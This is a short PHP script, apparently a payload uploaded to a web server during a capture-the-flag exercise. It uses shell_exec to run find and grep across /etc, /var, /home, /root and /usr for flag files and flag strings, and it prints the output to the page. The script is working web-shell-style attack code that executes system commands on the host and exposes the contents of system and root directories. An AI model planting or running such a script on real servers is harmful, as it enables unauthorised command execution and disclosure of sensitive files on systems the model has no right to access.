<?php
echo "<pre>";

// Define directories to search (avoiding problematic ones)
$search_dirs = array(
    '/passoire',
    '/etc',
    '/var',
    '/home',
    '/root',
    '/usr'
);

// Format directories for command
$dir_string = implode(' ', $search_dirs);

echo "Searching in directories: " . $dir_string . "\n\n";

// Search for files named flag_*
echo "Searching for files named flag_*:\n";
$find_command = "find $dir_string -name 'flag_*' 2>/dev/null";
$files = shell_exec($find_command);
echo $files . "\n";

// Search through files for flag pattern
echo "\nSearching file contents for flag pattern:\n";
$grep_command = "grep -r 'flag_[0-9]* is [a-f0-9]*' $dir_string 2>/dev/null";
$contents = shell_exec($grep_command);
echo $contents;

echo "</pre>";
?>
